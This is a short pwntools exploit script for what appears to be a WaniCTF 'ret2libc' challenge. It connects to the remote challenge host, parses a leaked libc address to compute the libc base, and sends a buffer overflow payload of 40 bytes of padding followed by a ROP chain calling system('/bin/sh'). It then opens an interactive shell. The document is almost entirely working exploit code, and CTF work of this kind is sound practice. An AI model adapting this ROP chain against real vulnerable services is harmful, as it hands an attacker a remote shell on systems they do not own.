from pwn import *

HOST = "ret2libc-pwn.wanictf.org"
PORT = 9007
file = "./chall"
e = ELF(file)

#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")

context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

command = '''
'''

#io = gdb.debug(file, command)
#io = process(file)
io = remote(HOST, PORT)


io.recvuntil(b" +0x28 | ")
libc_leak = int(io.recvuntil(b" ")[:-1], 16)
libc.address = libc_leak - 0x29d90
io.debug(f"libc base address: {libc.address:x}")

rop_libc_pop_rdi = libc.address + 0x002a3e5
rop_libc_ret = libc.address + 0x00f90e1
io.debug(f"pop_rdi@glibc : {rop_libc_pop_rdi:x}")
io.debug(f"ret@glibc : {rop_libc_ret:x}")

pld = b"A"*40
pld += p64(rop_libc_ret)
pld += p64(rop_libc_pop_rdi)
pld += p64(next(libc.search(b"/bin/sh\x00")))
pld += p64(libc.sym["system"])
pld += b"\x00"*(128-len(pld))

io.sendlineafter(b"> ", pld)

io.interactive()
